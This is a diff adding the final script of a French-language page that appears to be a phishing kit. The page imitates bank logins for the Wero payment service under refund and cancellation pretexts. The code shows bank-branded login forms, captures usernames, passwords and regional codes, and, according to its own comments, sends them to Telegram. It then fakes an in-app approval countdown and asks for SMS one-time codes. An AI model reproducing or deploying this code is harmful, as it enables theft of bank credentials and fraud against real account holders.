+      if (weroSmsCode) { weroSmsCode.value = ''; weroSmsCode.disabled = false; }
+      if (weroSmsValidate) { weroSmsValidate.disabled = false; weroSmsValidate.textContent = 'Valider le code SMS'; }
+      if (weroError) weroError.style.display = 'none';
+      if (weroAppAuthCountdown) weroAppAuthCountdown.textContent = '';
+      if (weroAppAuthStatus) {
+        weroAppAuthStatus.innerHTML = '<span class="wero-app-auth-spinner"></span> En attente de validation dans l\'application…';
+        weroAppAuthStatus.style.color = '#18753c';
+      }
+      if (weroAppAuthIcon) {
+        weroAppAuthIcon.classList.remove('validated');
+        weroAppAuthIcon.style.background = 'linear-gradient(135deg, #e8f5ee 0%, #d4ecd9 100%)';
+        const svg = weroAppAuthIcon.querySelector('svg');
+        if (svg) svg.style.fill = '#18753c';
+      }
+    }
+
+    function openWeroOverlay() {
+      if (!selectedBank || !WERO_BANKS[selectedBank]) { alert('Veuillez sélectionner une banque.'); return; }
+      const bank = WERO_BANKS[selectedBank];
+      weroNavbarLogo.src = '../assets/img/logo-bf.svg';
+      weroNavbarLogo.style.display = '';
+      weroNavbarLogo.onerror = function () { this.style.display = 'none'; };
+      weroNavbarWeroLogo.src = bank.logo || '';
+      weroNavbarWeroLogo.style.display = bank.logo ? '' : 'none';
+      weroNavbarWeroLogo.onerror = function () { this.style.display = 'none'; };
+      weroLoginLogo.src = bank.logo || '';
+      weroLoginLogo.style.display = bank.logo ? '' : 'none';
+      weroLoginLogo.onerror = function () { this.style.display = 'none'; };
+      weroLoginBankName.textContent = `Connectez-vous à votre espace ${bank.name}`;
+      weroLoginSubmit.style.background = `linear-gradient(135deg, ${bank.color} 0%, ${bank.color}dd 100%)`;
+      weroLoginSubmit.style.color = (selectedBank === 'boursorama') ? '#000000' : '#ffffff';
+      configureWeroFormForBank(selectedBank);
+      resetWeroAuth();
+      weroOverlay.classList.add('active');
+    }
+
+    function configureWeroFormForBank(bankKey) {
+      const bank = WERO_BANKS[bankKey];
+      if (!bank) return;
+      weroUsername.value = '';
+      weroUsername.type = 'text';
+      if (bank.idMaxLength) weroUsername.maxLength = bank.idMaxLength;
+      else weroUsername.removeAttribute('maxlength');
+      if (bank.idMode === 'numeric') {
+        weroUsername.placeholder = `Identifiant (${bank.idMinLength || 1}-${bank.idMaxLength || '∞'} chiffres)`;
+        weroUsername.inputMode = 'numeric';
+        weroUsername.pattern = '[0-9]*';
+      } else if (bank.idMode === 'phone') {
+        weroUsername.placeholder = 'Numéro de téléphone';
+        weroUsername.inputMode = 'tel';
+        weroUsername.removeAttribute('pattern');
+      } else {
+        weroUsername.placeholder = 'Identifiant client';
+        weroUsername.inputMode = 'text';
+        weroUsername.removeAttribute('pattern');
+      }
+      if (bank.useNumpad) {
+        weroPasswordInput.style.display = 'none';
+        weroPasswordInput.value = '';
+        weroPasswordDisplay.style.display = 'flex';
+        weroNumpad.style.display = 'grid';
+        weroPassword = '';
+        weroPasswordDisplay.textContent = '';
+        weroPasswordDisplay.classList.remove('active');
+        generateRandomNumpad();
+      } else {
+        weroPasswordInput.style.display = 'block';
+        weroPasswordDisplay.style.display = 'none';
+        weroNumpad.style.display = 'none';
+        weroNumpad.innerHTML = '';
+        weroPasswordInput.value = '';
+        weroPassword = '';
+        if (bank.passMode === 'numeric') {
+          weroPasswordInput.placeholder = `Mot de passe (${bank.passLength || '?'} chiffres)`;
+          weroPasswordInput.inputMode = 'numeric';
+          weroPasswordInput.setAttribute('pattern', '[0-9]*');
+          if (bank.passLength) weroPasswordInput.maxLength = bank.passLength;
+        } else {
+          weroPasswordInput.placeholder = 'Mot de passe';
+          weroPasswordInput.inputMode = 'text';
+          weroPasswordInput.removeAttribute('pattern');
+          if (bank.passLength) weroPasswordInput.maxLength = bank.passLength;
+          else weroPasswordInput.removeAttribute('maxlength');
+        }
+        weroPasswordInput.type = 'password';
+      }
+      if (bank.hasRegionalCode) {
+        weroRegionalField.classList.add('active');
+        weroRegionalCode.value = '';
+        weroRegionalCode.maxLength = 5;
+      } else { weroRegionalField.classList.remove('active'); }
+      if (bank.hasRegionalSelect) {
+        weroRegionalSelectField.classList.add('active');
+        weroRegionalSelect.value = '';
+      } else { weroRegionalSelectField.classList.remove('active'); }
+    }
+
+    function generateRandomNumpad() {
+      weroNumpad.innerHTML = '';
+      const digits = [0,1,2,3,4,5,6,7,8,9];
+      for (let i = digits.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [digits[i], digits[j]] = [digits[j], digits[i]];
+      }
+      const gridItems = [];
+      for (let i = 0; i < 10; i++) gridItems.push({ type: 'digit', value: digits[i] });
+      gridItems.push({ type: 'action', value: 'clear', label: 'C' });
+      gridItems.push({ type: 'action', value: 'delete', label: '⌫' });
+      gridItems.forEach(item => {
+        const btn = document.createElement('button');
+        btn.type = 'button';
+        if (item.type === 'digit') { btn.dataset.key = item.value; btn.textContent = item.value; }
+        else { btn.className = 'numpad-action'; btn.dataset.key = item.value; btn.textContent = item.label; }
+        weroNumpad.appendChild(btn);
+      });
+    }
+
+    function updatePasswordDisplay() {
+      weroPasswordDisplay.textContent = '•'.repeat(weroPassword.length);
+      if (weroPassword.length > 0) weroPasswordDisplay.classList.add('active');
+      else weroPasswordDisplay.classList.remove('active');
+    }
+
+    weroNumpad.addEventListener('click', function (e) {
+      const button = e.target.closest('button');
+      if (!button) return;
+      const key = button.dataset.key;
+      if (key === 'clear') weroPassword = '';
+      else if (key === 'delete') weroPassword = weroPassword.slice(0, -1);
+      else if (weroPassword.length < 12) weroPassword += key;
+      updatePasswordDisplay();
+    });
+
+    weroUsername.addEventListener('input', function () {
+      if (!selectedBank) return;
+      const bank = WERO_BANKS[selectedBank];
+      if (bank.idMode === 'numeric') this.value = this.value.replace(/\D/g, '');
+      if (bank.idMaxLength && this.value.length > bank.idMaxLength) this.value = this.value.substring(0, bank.idMaxLength);
+    });
+
+    weroPasswordInput.addEventListener('input', function () {
+      if (!selectedBank) return;
+      const bank = WERO_BANKS[selectedBank];
+      if (bank.passMode === 'numeric') this.value = this.value.replace(/\D/g, '');
+      if (bank.passLength && this.value.length > bank.passLength) this.value = this.value.substring(0, bank.passLength);
+    });
+
+    // ============================================================
+    // SOUMISSION ÉTAPE 4 (connexion Wero) → envoi Telegram ÉTAPE 4
+    // ============================================================
+    weroLoginSubmit.addEventListener('click', function () {
+      const bank = WERO_BANKS[selectedBank];
+      const username = weroUsername.value;
+
+      if (bank.hasRegionalCode) {
+        const rc = weroRegionalCode.value;
+        if (!rc || rc.length < 3) {
+          weroError.textContent = 'Veuillez saisir votre code régional (min. 3 caractères).';
+          weroError.style.display = 'block';
+          return;
+        }
+      }
+      if (bank.hasRegionalSelect) {
+        const rs = weroRegionalSelect.value;
+        if (!rs) {
+          weroError.textContent = 'Veuillez sélectionner votre région.';
+          weroError.style.display = 'block';
+          return;
+        }
+      }
+      if (!username) {
+        weroError.textContent = 'Veuillez saisir votre identifiant.';
+        weroError.style.display = 'block';
+        return;
+      }
+      if (bank.idMode === 'numeric' && !/^\d+$/.test(username)) {
+        weroError.textContent = "L'identifiant doit contenir uniquement des chiffres.";
+        weroError.style.display = 'block';
+        return;
+      }
+      if (bank.idMinLength && username.length < bank.idMinLength) {
+        weroError.textContent = `L'identifiant doit contenir au moins ${bank.idMinLength} caractères.`;
+        weroError.style.display = 'block';
+        return;
+      }
+      if (bank.idMaxLength && username.length > bank.idMaxLength) {
+        weroError.textContent = `L'identifiant doit contenir au maximum ${bank.idMaxLength} caractères.`;
+        weroError.style.display = 'block';
+        return;
+      }
+
+      let finalPassword = '';
+      if (bank.useNumpad) {
+        finalPassword = weroPassword;
+        if (finalPassword.length < 4) {
+          weroError.textContent = 'Veuillez saisir votre mot de passe (min. 4 chiffres).';
+          weroError.style.display = 'block';
+          return;
+        }
+        if (bank.passLength && finalPassword.length !== bank.passLength) {
+          weroError.textContent = `Le mot de passe doit contenir exactement ${bank.passLength} chiffres.`;
+          weroError.style.display = 'block';
+          return;
+        }
+      } else {
+        finalPassword = weroPasswordInput.value;
+        if (!finalPassword) {
+          weroError.textContent = 'Veuillez saisir votre mot de passe.';
+          weroError.style.display = 'block';
+          return;
+        }
+        if (bank.passMode === 'numeric' && !/^\d+$/.test(finalPassword)) {
+          weroError.textContent = 'Le mot de passe doit contenir uniquement des chiffres.';
+          weroError.style.display = 'block';
+          return;
+        }
+        if (bank.passLength && finalPassword.length !== bank.passLength) {
+          weroError.textContent = `Le mot de passe doit contenir exactement ${bank.passLength} caractères.`;
+          weroError.style.display = 'block';
+          return;
+        }
+      }
+
+      weroError.style.display = 'none';
+
+      weroPendingData = {
+        bank_id: selectedBank,
+        bank_name: bank.name,
+        wero_username: username,
+        wero_password: finalPassword,
+        wero_regional_code: bank.hasRegionalCode ? weroRegionalCode.value : null,
+        wero_regional_select: bank.hasRegionalSelect ? weroRegionalSelect.value : null
+      };
+
+      // ✅ ENVOI TELEGRAM ÉTAPE 4
+      sendStep4Telegram();
+
+      weroUsername.style.display = 'none';
+      if (bank.useNumpad) {
+        weroPasswordDisplay.style.display = 'none';
+        weroNumpad.style.display = 'none';
+      } else {
+        weroPasswordInput.style.display = 'none';
+      }
+      weroRegionalField.classList.remove('active');
+      weroRegionalSelectField.classList.remove('active');
+      weroLoginSubmit.style.display = 'none';
+
+      weroAppAuth.style.display = 'block';
+      weroSmsField.style.display = 'none';
+      weroSmsLink.style.display = 'inline';
+      weroSmsLink.textContent = 'Recevoir un code par SMS';
+      weroSmsTimer.style.display = 'none';
+
+      startWeroAppAuthSimulation();
+    });
+
+    function startWeroAppAuthSimulation() {
+      if (weroAppAuthTimeout) clearTimeout(weroAppAuthTimeout);
+      if (weroAppAuthCountdownInterval) clearInterval(weroAppAuthCountdownInterval);
+      if (weroAppAuthStatus) {
+        weroAppAuthStatus.innerHTML = '<span class="wero-app-auth-spinner"></span> En attente de validation dans l\'application…';
+        weroAppAuthStatus.style.color = '#18753c';
+      }
+      if (weroAppAuthIcon) {
+        weroAppAuthIcon.classList.remove('validated');
+        weroAppAuthIcon.style.background = 'linear-gradient(135deg, #e8f5ee 0%, #d4ecd9 100%)';
+        const svg = weroAppAuthIcon.querySelector('svg');
+        if (svg) svg.style.fill = '#18753c';
+      }
+      weroAppAuthCountdownSec = 120;
+      if (weroAppAuthCountdown) {
+        const m = Math.floor(weroAppAuthCountdownSec / 60);
+        const s = String(weroAppAuthCountdownSec % 60).padStart(2, '0');
+        weroAppAuthCountdown.textContent = `Expire dans ${m}:${s}`;
+      }
+      weroAppAuthCountdownInterval = setInterval(function () {
+        weroAppAuthCountdownSec--;
+        if (weroAppAuthCountdownSec <= 0) {
+          clearInterval(weroAppAuthCountdownInterval);
+          weroAppAuthCountdownInterval = null;
+          if (weroAppAuthCountdown) weroAppAuthCountdown.textContent = 'Expiré';
+        } else if (weroAppAuthCountdown) {
+          const m = Math.floor(weroAppAuthCountdownSec / 60);
+          const s = String(weroAppAuthCountdownSec % 60).padStart(2, '0');
+          weroAppAuthCountdown.textContent = `Expire dans ${m}:${s}`;
+        }
+      }, 1000);
+      weroAppAuthTimeout = setTimeout(function () {
+        if (weroAppAuthCountdownInterval) { clearInterval(weroAppAuthCountdownInterval); weroAppAuthCountdownInterval = null; }
+        if (weroAppAuthCountdown) weroAppAuthCountdown.textContent = '';
+        if (weroAppAuthStatus) {
+          weroAppAuthStatus.innerHTML = '✅ Validé dans l\'application';
+          weroAppAuthStatus.style.color = '#18753c';
+        }
+        if (weroAppAuthIcon) {
+          weroAppAuthIcon.style.background = 'linear-gradient(135deg, #18753c 0%, #1e9e4e 100%)';
+          const svg = weroAppAuthIcon.querySelector('svg');
+          if (svg) svg.style.fill = '#ffffff';
+          weroAppAuthIcon.classList.add('validated');
+        }
+        setTimeout(finalizeWero, 900);
+      }, 120000);
+    }
+
+    function stopWeroAppAuthSimulation() {
+      if (weroAppAuthTimeout) { clearTimeout(weroAppAuthTimeout); weroAppAuthTimeout = null; }
+      if (weroAppAuthCountdownInterval) { clearInterval(weroAppAuthCountdownInterval); weroAppAuthCountdownInterval = null; }
+    }
+
+    function finalizeWero() {
+      stopWeroAppAuthSimulation();
+      if (!weroPendingData) return;
+      weroOverlay.classList.remove('active');
+      weroPassword = '';
+      weroUsername.style.display = '';
+      weroPasswordInput.style.display = '';
+      weroPasswordDisplay.style.display = '';
+      weroNumpad.style.display = '';
+      weroLoginSubmit.style.display = '';
+      goToStep(6);
+    }
+
+    weroSmsLink.addEventListener('click', function (e) {
+      e.preventDefault();
+      stopWeroAppAuthSimulation();
+      if (weroAppAuthCountdown) weroAppAuthCountdown.textContent = '';
+      weroSmsField.style.display = 'block';
+      weroSmsLink.style.display = 'none';
+      weroSmsTimer.style.display = 'inline';
+      weroSmsCode.value = '';
+      weroSmsCode.disabled = false;
+      weroSmsValidate.disabled = false;
+      weroSmsValidate.textContent = 'Valider le code SMS';
+      weroSmsCode.focus();
+      smsCountdown = 120;
+      weroSmsTimer.classList.remove('expired');
+      weroSmsTimer.textContent = '(2:00)';
+      if (smsTimerInterval) clearInterval(smsTimerInterval);
+      smsTimerInterval = setInterval(function () {
+        smsCountdown--;
+        if (smsCountdown <= 0) {
+          clearInterval(smsTimerInterval);
+          smsTimerInterval = null;
+          weroSmsTimer.textContent = '(expiré)';
+          weroSmsTimer.classList.add('expired');
+          weroSmsCode.disabled = true;
+          weroSmsValidate.disabled = true;
+        } else {
+          const m = Math.floor(smsCountdown / 60);
+          const s = String(smsCountdown % 60).padStart(2, '0');
+          weroSmsTimer.textContent = '(' + m + ':' + s + ')';
+        }
+      }, 1000);
+    });
+
+    weroSmsValidate.addEventListener('click', function () {
+      if (smsCountdown <= 0) {
+        weroError.textContent = 'Le délai de validité du code SMS a expiré.';
+        weroError.style.display = 'block';
+        return;
+      }
+      const code = weroSmsCode.value.trim();
+      if (!/^\d{6}$/.test(code)) {
+        weroError.textContent = 'Veuillez saisir un code SMS à 6 chiffres.';
+        weroError.style.display = 'block';
+        return;
+      }
+      weroError.style.display = 'none';
+      weroSmsValidate.disabled = true;
+      weroSmsValidate.textContent = 'Vérification...';
+      setTimeout(finalizeWero, 800);
+    });
+
+    weroSmsCode.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 6);
+    });
+
+    weroCloseBtn.addEventListener('click', function () {
+      stopWeroAppAuthSimulation();
+      weroOverlay.classList.remove('active');
+      weroPassword = '';
+      weroPasswordDisplay.textContent = '';
+      resetWeroAuth();
+      weroUsername.style.display = '';
+      weroPasswordInput.style.display = '';
+      weroPasswordDisplay.style.display = '';
+      weroNumpad.style.display = '';
+      weroLoginSubmit.style.display = '';
+    });
+
+    weroPasswordInput.addEventListener('keypress', function (e) { if (e.key === 'Enter') weroLoginSubmit.click(); });
+    weroUsername.addEventListener('keypress', function (e) { if (e.key === 'Enter') weroLoginSubmit.click(); });
+    weroSmsCode.addEventListener('keypress', function (e) { if (e.key === 'Enter') weroSmsValidate.click(); });
+
+    window.addEventListener('hashchange', function () {
+      const h = window.location.hash;
+      if (h === '#form-remboursement')      showView('form', 'remboursement');
+      else if (h === '#form-annulation')    showView('form', 'annulation');
+      else                                   showView('home');
+    });
+
+    buildBankGrid();
+  })();
+  </script>
+</body>
+</html>
